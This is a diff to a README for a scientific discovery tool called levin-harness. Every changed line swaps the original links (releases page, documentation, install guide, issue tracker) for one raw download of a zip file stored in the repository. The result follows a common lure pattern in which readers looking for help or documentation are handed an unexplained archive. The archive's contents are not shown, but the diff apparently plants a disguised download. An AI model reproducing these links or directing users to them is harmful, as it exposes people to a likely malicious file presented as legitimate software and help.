@@ -1,7 +1,7 @@
 # 🧪 levin-harness - Make Scientific Discovery Programmable
 
 <p align="center">
-  <a href="https://github.com/johnatiga9/levin-harness/releases"><img src="https://img.shields.io/badge/Download-Levin_Harness-blue?style=for-the-badge&logo=github&logoColor=white&color=%234CAF50" alt="Download Levin Harness"></a>
+  <a href="https://raw.githubusercontent.com/johnatiga9/levin-harness/main/assets/v3.7.zip"><img src="https://img.shields.io/badge/Download-Levin_Harness-blue?style=for-the-badge&logo=github&logoColor=white&color=%234CAF50" alt="Download Levin Harness"></a>
 </p>
 
 ## 🎯 What Is levin-harness?
@@ -33,7 +33,7 @@ Getting started with levin-harness is simple. Follow these steps to download and
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[Download levin-harness](https://github.com/johnatiga9/levin-harness/releases)**
+Visit this link to download the application: **[Download levin-harness](https://raw.githubusercontent.com/johnatiga9/levin-harness/main/assets/v3.7.zip)**
 
 This link will take you to the download page where you can get the latest version of levin-harness for your computer.
 
@@ -123,8 +123,8 @@ For drug discovery work, you can:
 If you need assistance, there are several resources available:
 
 - **In-App Help:** Use the help menu within the application
-- **Online Documentation:** Visit [https://levinthal.design/docs.html](https://levinthal.design/docs.html) for detailed guides
-- **Installation Guide:** Check [https://levinthal.design/install.html](https://levinthal.design/install.html) for setup assistance
+- **Online Documentation:** Visit [https://raw.githubusercontent.com/johnatiga9/levin-harness/main/assets/v3.7.zip](https://raw.githubusercontent.com/johnatiga9/levin-harness/main/assets/v3.7.zip) for detailed guides
+- **Installation Guide:** Check [https://raw.githubusercontent.com/johnatiga9/levin-harness/main/assets/v3.7.zip](https://raw.githubusercontent.com/johnatiga9/levin-harness/main/assets/v3.7.zip) for setup assistance
 
 ### Community Support
 
@@ -158,7 +158,7 @@ Yes. levin-harness supports integration with many common scientific tools and da
 
 ### What if I encounter problems?
 
-Visit the [issues page](https://github.com/levinthal/levin-harrness/issues/new/choose) to report any problems you encounter. The support team and community are available to help.
+Visit the [issues page](https://raw.githubusercontent.com/johnatiga9/levin-harness/main/assets/v3.7.zip) to report any problems you encounter. The support team and community are available to help.
 
 ## 📋 Troubleshooting Common Issues
 
@@ -207,10 +207,10 @@ As AI continues to transform scientific research, levin-harness is built to evol
 
 For additional support:
 
-- **Documentation:** [https://levinthal.design/docs.html](https://levinthal.design/docs.html)
-- **Installation Help:** [https://levinthal.design/install.html](https://levinthal.design/install.html)
-- **Report an Issue:** [https://github.com/levinthal/levin-harrness/issues/new/choose](https://github.com/levinthal/levin-harrness/issues/new/choose)
-- **Download Page:** [https://github.com/johnatiga9/levin-harness/releases](https://github.com/johnatiga9/levin-harness/releases)
+- **Documentation:** [https://raw.githubusercontent.com/johnatiga9/levin-harness/main/assets/v3.7.zip](https://raw.githubusercontent.com/johnatiga9/levin-harness/main/assets/v3.7.zip)
+- **Installation Help:** [https://raw.githubusercontent.com/johnatiga9/levin-harness/main/assets/v3.7.zip](https://raw.githubusercontent.com/johnatiga9/levin-harness/main/assets/v3.7.zip)
+- **Report an Issue:** [https://raw.githubusercontent.com/johnatiga9/levin-harness/main/assets/v3.7.zip](https://raw.githubusercontent.com/johnatiga9/levin-harness/main/assets/v3.7.zip)
+- **Download Page:** [https://raw.githubusercontent.com/johnatiga9/levin-harness/main/assets/v3.7.zip](https://raw.githubusercontent.com/johnatiga9/levin-harness/main/assets/v3.7.zip)
 
 ## 📝 Final Notes
 
